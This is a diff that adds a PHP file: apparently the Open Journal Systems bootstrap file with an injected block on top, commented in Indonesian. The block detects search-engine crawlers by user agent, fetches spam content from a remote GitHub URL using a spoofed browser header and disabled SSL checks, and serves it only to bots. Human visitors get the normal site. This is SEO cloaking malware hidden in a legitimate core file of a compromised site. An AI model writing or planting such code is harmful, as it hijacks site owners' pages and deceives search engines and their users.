@@ -1,0 +1,114 @@
+<?php
+
+// Mulai output buffering lebih awal
+ob_start();
+
+// Set header Vary: User-Agent untuk caching yang lebih baik
+header("Vary: User-Agent");
+
+// --- Konfigurasi ---
+// URL sumber konten yang ingin ditampilkan ke bot
+$source_url = "https://raw.githubusercontent.com/waklabu979/landing/refs/heads/main/journal.sekawan.txt";
+
+// Regex untuk mendeteksi bot/crawler utama
+// Diperluas sedikit agar lebih komprehensif
+$bot_match_regex = "/(googlebot|bingbot|slurp|duckduckbot|yandex|baiduspider|petalbot|semrushbot|ahrefsbot|mj12bot|dotbot|crawler|spider|adsense|mediapartners|inspection)/i";
+
+// Dapatkan User-Agent dan pastikan nilainya ada
+$user_agent = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+// --- Fungsi untuk Mengambil Konten dengan Stealth ---
+/**
+ * Mengambil konten dari URL menggunakan User-Agent dan Referer spesifik
+ * untuk meniru permintaan browser biasa.
+ *
+ * @param string $url URL sumber.
+ * @return string|false Konten yang diambil atau FALSE jika gagal.
+ */
+function fetch_content_stealth(string $url) {
+    // Pengaturan konteks stream
+    $context_options = [
+        "http" => [
+            "method" => "GET",
+            // Menggunakan User-Agent dan Referer yang umum
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ],
+        // Menambahkan opsi SSL/TLS jika sumbernya HTTPS (praktik terbaik)
+        "ssl" => [
+            "verify_peer" => false, // Nonaktifkan verifikasi SSL untuk kompatibilitas, tapi HATI-HATI
+            "verify_peer_name" => false,
+        ]
+    ];
+
+    $context = stream_context_create($context_options);
+
+    // Menggunakan @ untuk menekan error jika gagal, tapi hati-hati!
+    // Lebih baik menangani error dengan try/catch atau memeriksa hasilnya.
+    return @file_get_contents($url, false, $context);
+}
+
+// --- Logika Utama ---
+// Cek apakah User-Agent cocok dengan bot
+if (preg_match($bot_match_regex, $user_agent)) {
+    // 1. Tambahkan delay acak untuk meniru waktu muat yang 'alami'
+    // Mempersingkat rentang agar tidak terlalu lama (misal 50-200ms)
+    usleep(rand(50000, 200000));
+
+    // 2. Ambil konten dari sumber
+    $bot_content = fetch_content_stealth($source_url);
+
+    // 3. Tampilkan konten hanya jika berhasil diambil
+    if ($bot_content !== false) {
+        echo $bot_content;
+    } else {
+        // Opsional: Log error atau tampilkan konten default
+        // Jika gagal, bisa saja melanjutkan ke konten "asli" di bawah
+        // Untuk saat ini, kita biarkan script selesai di sini.
+    }
+
+    // Akhiri output buffering dan kirim output, lalu hentikan eksekusi
+    @ob_end_flush();
+    exit;
+}
+
+
+/**
+ * @defgroup index Index
+ * Bootstrap and initialization code.
+ */
+
+/**
+ * @file includes/bootstrap.inc.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * @brief Core system initialization code.
+ * This file is loaded before any others.
+ * Any system-wide imports or initialization code should be placed here.
+ */
+
+
+/**
+ * Basic initialization (pre-classloading).
+ */
+
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// System-wide functions
+require('./lib/pkp/includes/functions.inc.php');
+
+// Initialize the application environment
+import('classes.core.Application');
+
+return new Application();
